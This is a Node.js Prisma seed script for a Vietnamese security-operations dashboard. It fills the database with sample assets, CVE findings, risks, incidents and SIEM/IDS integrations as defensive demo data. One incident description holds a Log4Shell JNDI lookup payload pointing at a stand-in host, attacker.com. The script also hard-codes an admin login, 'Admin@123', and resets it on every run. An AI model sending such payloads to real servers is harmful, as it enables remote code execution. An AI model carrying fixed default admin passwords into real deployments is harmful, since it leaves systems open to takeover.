const bcrypt = require('argon2');
const prisma = require('../src/config/prisma');

async function seed() {
  try {
    const roles = [
      { name: 'Admin', description: 'Quản trị hệ thống' },
      { name: 'Security Analyst', description: 'Phân tích an ninh' },
      { name: 'IT Manager', description: 'Quản lý tài sản CNTT' },
      { name: 'User', description: 'Người dùng cơ bản' },
    ];

    for (const role of roles) {
      await prisma.role.upsert({
        where: { name: role.name },
        update: {},
        create: role,
      });
    }

    const adminEmail = 'admin@gmail.com';
    const adminUsername = 'admin';
    const adminPasswordHash = await bcrypt.hash('Admin@123');

    const existingAdmin = await prisma.user.findFirst({
      where: {
        OR: [{ email: adminEmail }, { username: adminUsername }],
      },
    });

    if (existingAdmin) {
      await prisma.user.update({
        where: { id: existingAdmin.id },
        data: {
          email: adminEmail,
          username: adminUsername,
          passwordHash: adminPasswordHash,
          firstName: 'System',
          lastName: 'Administrator',
          isActive: true,
        },
      });
    } else {
      const user = await prisma.user.create({
        data: {
          username: adminUsername,
          email: adminEmail,
          passwordHash: adminPasswordHash,
          firstName: 'System',
          lastName: 'Administrator',
          isActive: true,
        },
      });

      const adminRole = await prisma.role.findUnique({ where: { name: 'Admin' } });
      await prisma.userRole.upsert({
        where: {
          userId_roleId: {
            userId: user.id,
            roleId: adminRole.id,
          },
        },
        update: {},
        create: {
          userId: user.id,
          roleId: adminRole.id,
        },
      });
    }

    const adminRole = await prisma.role.findUnique({ where: { name: 'Admin' } });
    const finalAdmin = await prisma.user.findFirst({
      where: { email: adminEmail },
    });

    if (finalAdmin) {
      await prisma.userRole.upsert({
        where: {
          userId_roleId: {
            userId: finalAdmin.id,
            roleId: adminRole.id,
          },
        },
        update: {},
        create: {
          userId: finalAdmin.id,
          roleId: adminRole.id,
        },
      });
    }

    const assetCategoryList = [
      { name: 'Server', description: 'Máy chủ' },
      { name: 'Workstation', description: 'Máy trạm' },
      { name: 'Network', description: 'Thiết bị mạng' },
      { name: 'Software', description: 'Phần mềm' },
    ];

    for (const item of assetCategoryList) {
      await prisma.assetCategory.upsert({
        where: { name: item.name },
        update: {},
        create: item,
      });
    }

    const serverCategory = await prisma.assetCategory.findUnique({ where: { name: 'Server' } });
    const workstationCategory = await prisma.assetCategory.findUnique({ where: { name: 'Workstation' } });
    const networkCategory = await prisma.assetCategory.findUnique({ where: { name: 'Network' } });

    const assetData = [
      {
        assetId: 'ASSET-001',
        name: 'Core Firewall',
        type: 'Firewall',
        categoryId: serverCategory.id,
        ipAddress: '192.168.10.1',
        macAddress: '00:1A:2B:3C:4D:5E',
        os: 'pfSense',
        owner: 'IT Manager',
        location: 'DC-1',
        status: 'active',
        criticality: 'high',
      },
      {
        assetId: 'ASSET-002',
        name: 'Web Server',
        type: 'Server',
        categoryId: serverCategory.id,
        ipAddress: '192.168.10.21',
        macAddress: '00:1A:2B:3C:4D:6F',
        os: 'Ubuntu 22.04',
        owner: 'IT Manager',
        location: 'DC-1',
        status: 'active',
        criticality: 'critical',
      },
      {
        assetId: 'ASSET-003',
        name: 'HR Workstation',
        type: 'Workstation',
        categoryId: workstationCategory.id,
        ipAddress: '192.168.10.55',
        macAddress: '00:AA:BB:CC:DD:EE',
        os: 'Windows 11',
        owner: 'HR',
        location: 'Office-2',
        status: 'active',
        criticality: 'medium',
      },
      // ── Protect: Network Security, Firewall, VPN & Domain Controller ──
      {
        assetId: 'ASSET-004',
        name: 'Perimeter FortiGate Firewall',
        type: 'Firewall',
        categoryId: networkCategory.id,
        ipAddress: '192.168.1.1',
        macAddress: '00:09:0F:AA:11:22',
        os: 'FortiOS 7.4',
        owner: 'Network Team',
        location: 'DC-1',
        status: 'active',
        criticality: 'critical',
      },
      {
        assetId: 'ASSET-005',
        name: 'Branch Router MikroTik',
        type: 'Router',
        categoryId: networkCategory.id,
        ipAddress: '192.168.20.1',
        macAddress: 'D4:CA:6D:12:34:56',
        os: 'RouterOS v7',
        owner: 'Network Team',
        location: 'Branch-HN',
        status: 'active',
        criticality: 'high',
      },
      {
        assetId: 'ASSET-006',
        name: 'OPNsense Edge Gateway',
        type: 'Firewall',
        categoryId: networkCategory.id,
        ipAddress: '192.168.30.1',
        macAddress: '00:1B:21:44:55:66',
        os: 'OPNsense 24.1',
        owner: 'Security Analyst',
        location: 'DC-2',
        status: 'active',
        criticality: 'high',
      },
      {
        assetId: 'ASSET-007',
        name: 'Corporate OpenVPN Access Server & IPSec',
        type: 'VPN Gateway',
        categoryId: networkCategory.id,
        ipAddress: '192.168.1.10',
        macAddress: '00:50:56:AB:CD:EF',
        os: 'OpenVPN-AS / Debian 12',
        owner: 'IT Manager',
        location: 'DC-1',
        status: 'active',
        criticality: 'high',
      },
      {
        assetId: 'ASSET-008',
        name: 'Windows Server Primary Domain Controller',
        type: 'Domain Controller',
        categoryId: serverCategory.id,
        ipAddress: '192.168.10.5',
        macAddress: '00:50:56:FE:DC:BA',
        os: 'Windows Server 2022 (Active Directory, Kerberos KDC, RADIUS/NPS)',
        owner: 'System Admin',
        location: 'DC-1',
        status: 'active',
        criticality: 'critical',
      },
    ];

    for (const asset of assetData) {
      await prisma.asset.upsert({
        where: { assetId: asset.assetId },
        update: {},
        create: asset,
      });
    }

    // Seed Sample Vulnerabilities for Stage 2
    const webServer = await prisma.asset.findUnique({ where: { assetId: 'ASSET-002' } });
    const firewall = await prisma.asset.findUnique({ where: { assetId: 'ASSET-001' } });
    const workstation = await prisma.asset.findUnique({ where: { assetId: 'ASSET-003' } });

    if (webServer) {
      const existingVuln = await prisma.vulnerability.findFirst({ where: { assetId: webServer.id } });
      if (!existingVuln) {
        await prisma.vulnerability.createMany({
          data: [
            {
              assetId: webServer.id,
              title: 'Apache Log4j Remote Code Execution (Log4Shell)',
              severity: 'critical',
              cve: 'CVE-2021-44228',
              cvssScore: 10.0,
              description: 'Lỗ hổng thực thi mã từ xa nguy hiểm cho phép kẻ tấn công kiểm soát hoàn toàn máy chủ thông qua JNDI lookup.',
              recommendation: 'Nâng cấp Log4j lên phiên bản 2.17.1 hoặc áp dụng cờ cấu hình log4j2.formatMsgNoLookups=true.',
              status: 'open',
            },
            {
              assetId: webServer.id,
              title: 'OpenSSH User Enumeration Vulnerability',
              severity: 'medium',
              cve: 'CVE-2018-15473',
              cvssScore: 5.3,
              description: 'Cho phép kẻ tấn công dò tìm danh sách tên người dùng hợp lệ trên hệ thống mục tiêu.',
              recommendation: 'Nâng cấp OpenSSH lên phiên bản mới nhất và chỉ cho phép đăng nhập SSH qua khóa riêng tư (Key-based authentication).',
              status: 'in_progress',
            },
          ],
        });

        await prisma.alert.create({
          data: {
            title: 'Phát hiện lỗ hổng Critical: CVE-2021-44228 (Log4Shell)',
            description: 'Lỗ hổng mức độ nghiêm trọng CVSS 10.0 phát hiện trên Web Server (192.168.10.21).',
            severity: 'critical',
            relatedAssetId: webServer.id,
            status: 'open',
          },
        });
      }

      const existingRisk = await prisma.risk.findFirst({ where: { assetId: webServer.id } });
      if (!existingRisk) {
        await prisma.risk.createMany({
          data: [
            {
              assetId: webServer.id,
              title: 'Nguy cơ chiếm quyền điều khiển máy chủ từ xa qua lỗ hổng RCE',
              likelihood: 'high',
              impact: 'high',
              riskLevel: 'critical',
              mitigation: 'Cách ly phân vùng mạng DMZ, vá khẩn cấp Log4j và cập nhật WAF rules.',
              status: 'open',
            },
            {
              assetId: webServer.id,
              title: 'Nguy cơ tấn công từ chối dịch vụ DoS làm gián đoạn cổng thông tin',
              likelihood: 'high',
              impact: 'medium',
              riskLevel: 'high',
              mitigation: 'Kích hoạt Module Rate Limiting và định tuyến qua CDN bảo vệ.',
              status: 'in_progress',
            },
          ],
        });
      }
    }

    if (firewall) {
      const existingVuln = await prisma.vulnerability.findFirst({ where: { assetId: firewall.id } });
      if (!existingVuln) {
        await prisma.vulnerability.create({
          data: {
            assetId: firewall.id,
            title: 'Weak SSL/TLS Ciphers Suites Enabled (SWEET32)',
            severity: 'low',
            cve: 'CVE-2016-2183',
            cvssScore: 5.3,
            description: 'Giao thức mã hóa sử dụng khối 64-bit dễ bị tấn công giải mã trong một số điều kiện truyền tải lưu lượng lớn.',
            recommendation: 'Vô hiệu hóa toàn bộ 3DES và CBC ciphers, chỉ hỗ trợ TLS 1.2 và TLS 1.3.',
            status: 'open',
          },
        });
      }

      const existingRisk = await prisma.risk.findFirst({ where: { assetId: firewall.id } });
      if (!existingRisk) {
        await prisma.risk.create({
          data: {
            assetId: firewall.id,
            title: 'Nguy cơ tấn công Man-in-the-Middle thu thập thông tin quản trị mạng',
            likelihood: 'low',
            impact: 'medium',
            riskLevel: 'medium',
            mitigation: 'Cấu hình chặt chẽ chính sách chứng chỉ SSL/TLS và giới hạn IP quản trị firewall.',
            status: 'open',
          },
        });
      }
    }

    if (workstation) {
      const existingRisk = await prisma.risk.findFirst({ where: { assetId: workstation.id } });
      if (!existingRisk) {
        await prisma.risk.create({
          data: {
            assetId: workstation.id,
            title: 'Nguy cơ lây nhiễm mã độc Ransomware qua email lừa đảo (Phishing)',
            likelihood: 'medium',
            impact: 'high',
            riskLevel: 'high',
            mitigation: 'Cài đặt EDR Endpoint Security, quét tệp đính kèm và định kỳ đào tạo nâng cao nhận thức bảo mật cho nhân sự.',
            status: 'open',
          },
        });
      }
    }

    // Seed Sample Incidents for Stage 3
    const existingIncidents = await prisma.incident.count();
    if (existingIncidents === 0 && webServer && workstation) {
      const inc1 = await prisma.incident.create({
        data: {
          title: 'Phát hiện chuỗi tấn công Brute-force dịch vụ SSH',
          description: 'Hệ thống giám sát ghi nhận hơn 250 lượt thử đăng nhập tài khoản root thất bại trong vòng 3 phút từ IP 203.0.113.45.',
          type: 'Brute-force attack',
          severity: 'high',
          assetId: webServer.id,
          detectedBy: 'Suricata IDS',
          status: 'investigating',
          assignedTo: 'Security Analyst',
        },
      });

      await prisma.incidentAction.createMany({
        data: [
          {
            incidentId: inc1.id,
            action: 'INITIAL_DISCOVERY',
            notes: 'Hệ thống Suricata IDS kích hoạt rule cảnh báo SSH Brute-force threshold exceeded.',
          },
          {
            incidentId: inc1.id,
            action: 'ANALYZE_LOGS',
            notes: 'Phân tích auth.log xác nhận IP 203.0.113.45 thử danh sách mật khẩu phổ biến.',
          },
        ],
      });

      const inc2 = await prisma.incident.create({
        data: {
          title: 'Nghi vấn khai thác lỗ hổng Log4j qua HTTP User-Agent Header',
          description: 'Phát hiện chuỗi JNDI LDAP lookup độc hại ${jndi:ldap://attacker.com/exploit} trong request gửi tới máy chủ Web.',
          type: 'Vulnerability exploitation',
          severity: 'critical',
          assetId: webServer.id,
          detectedBy: 'Wazuh SIEM',
          status: 'new',
          assignedTo: 'Admin',
        },
      });

      await prisma.incidentAction.create({
        data: {
          incidentId: inc2.id,
          action: 'INITIAL_DISCOVERY',
          notes: 'Wazuh rule 100200 kích hoạt cảnh báo nguy cơ RCE Log4Shell mức Critical.',
        },
      });

      const inc3 = await prisma.incident.create({
        data: {
          title: 'Phát hiện tập tin nghi ngờ mã độc Trojan trên máy trạm nhân sự',
          description: 'Tiến trình powershell.exe thực thi script tải file không xác định từ Internet.',
          type: 'Malware detection',
          severity: 'medium',
          assetId: workstation.id,
          detectedBy: 'EDR Endpoint Agent',
          status: 'contained',
          assignedTo: 'IT Manager',
        },
      });

      await prisma.incidentAction.createMany({
        data: [
          {
            incidentId: inc3.id,
            action: 'INITIAL_DISCOVERY',
            notes: 'EDR cảnh báo hành vi powershell download ngầm.',
          },
          {
            incidentId: inc3.id,
            action: 'QUARANTINE_ASSET',
            notes: 'Đã cô lập kết nối mạng của máy trạm HR Workstation để phục vụ điều tra mã độc.',
          },
        ],
      });
    }

    // Seed Sample Security Tool Integrations (NIST DETECT & RESPOND)
    const securityIntegrations = [
      {
        name: 'Wazuh SIEM & XDR',
        type: 'SIEM',
        endpoint: 'https://wazuh.lab.internal:55000',
        status: 'active',
        configJson: JSON.stringify({ cluster: 'wazuh-primary', agentsCount: 12, rulesVersion: 'v4.7.2' }),
      },
      {
        name: 'Suricata Network IDS/IPS',
        type: 'IDS_IPS',
        endpoint: 'http://192.168.10.1:8000/suricata',
        status: 'active',
        configJson: JSON.stringify({ interface: 'eth0', ruleset: 'ET-Open', mode: 'inline-ips' }),
      },
      {
        name: 'Snort Network IDS',
        type: 'IDS_IPS',
        endpoint: 'http://192.168.10.1:8000/snort',
        status: 'active',
        configJson: JSON.stringify({ engine: 'Snort 3', rules: 'Community-Ruleset', mode: 'alert-fast' }),
      },
      {
        name: 'Prometheus + Grafana Dashboard',
        type: 'Monitoring',
        endpoint: 'http://192.168.10.21:3000',
        status: 'active',
        configJson: JSON.stringify({ prometheusUrl: 'http://192.168.10.21:9090', dashboards: ['Host Metrics', 'Network Traffic', 'Security Events'] }),
      },
      {
        name: 'Graylog Centralized Log Management',
        type: 'SIEM',
        endpoint: 'http://graylog.lab.internal:9000',
        status: 'configured',
        configJson: JSON.stringify({ inputs: ['Syslog UDP', 'GELF TCP'], stream: 'Security-Audit' }),
      },
      {
        name: 'Zabbix Enterprise Monitoring',
        type: 'Monitoring',
        endpoint: 'http://zabbix.lab.internal/zabbix',
        status: 'configured',
        configJson: JSON.stringify({ pollInterval: '30s', hostsMonitored: 8, triggersActive: 2 }),
      },
      {
        name: 'Splunk Enterprise Security',
        type: 'SIEM',
        endpoint: 'https://splunk.lab.internal:8000',
        status: 'configured',
        configJson: JSON.stringify({ index: 'soc_security_events', retentionDays: 90 }),
      },
      {
        name: 'PRTG / Nagios Network Monitor',
        type: 'Monitoring',
        endpoint: 'https://prtg.lab.internal',
        status: 'configured',
        configJson: JSON.stringify({ sensorTypes: ['Ping', 'HTTP/HTTPS', 'SNMP Bandwidth', 'Port Health'] }),
      },
      {
        name: 'Artica Web Application Firewall',
        type: 'WAF',
        endpoint: 'https://waf.lab.internal:9443',
        status: 'active',
        configJson: JSON.stringify({ mode: 'blocking', rules: 'OWASP-CRS-v3.3', action: 'Drop & Alert' }),
      },
    ];

    for (const item of securityIntegrations) {
      const exists = await prisma.integration.findFirst({ where: { name: item.name } });
      if (!exists) {
        await prisma.integration.create({ data: item });
      }
    }

    // ── Stage 4: System Settings & Infrastructure Recovery ──────────────────
    const infraSettings = [
      { key: 'backup.autoBackup.enabled', value: 'true', category: 'backup' },
      { key: 'backup.autoBackup.intervalHours', value: '24', category: 'backup' },
      { key: 'backup.retention.days', value: '30', category: 'backup' },
      { key: 'backup.maxBackups', value: '10', category: 'backup' },
      { key: 'recovery.infrastructure.loadBalancing', value: 'Active - MikroTik RouterOS & pfSense CARP Failover High Availability', category: 'recovery' },
      { key: 'recovery.infrastructure.synologyDsm', value: 'Active - Snapshot Replication to Synology DSM (Xpenology VM target)', category: 'recovery' },
      { key: 'recovery.infrastructure.freeNasTrueNas', value: 'Configured - ZFS Pool Automated Snapshots on TrueNAS Core', category: 'recovery' },
      { key: 'recovery.infrastructure.linuxNfsTarCron', value: 'Active - Automated Tar backup via Crontab to Remote NFS Share', category: 'recovery' },
      { key: 'security.sessionTimeoutMinutes', value: '480', category: 'security' },
      { key: 'security.maxLoginAttempts', value: '5', category: 'security' },
      { key: 'security.passwordMinLength', value: '8', category: 'security' },
      { key: 'system.appName', value: 'SecureWeb', category: 'system' },
      { key: 'system.version', value: '1.0.0', category: 'system' },
      { key: 'system.timezone', value: 'Asia/Ho_Chi_Minh', category: 'system' },
    ];

    for (const s of infraSettings) {
      await prisma.systemSetting.upsert({
        where: { key: s.key },
        update: { value: s.value, category: s.category },
        create: s,
      });
    }

    console.log('Seed completed successfully');
  } catch (error) {
    console.error('Seed failed:', error);
  } finally {
    await prisma.$disconnect();
  }
}

seed();
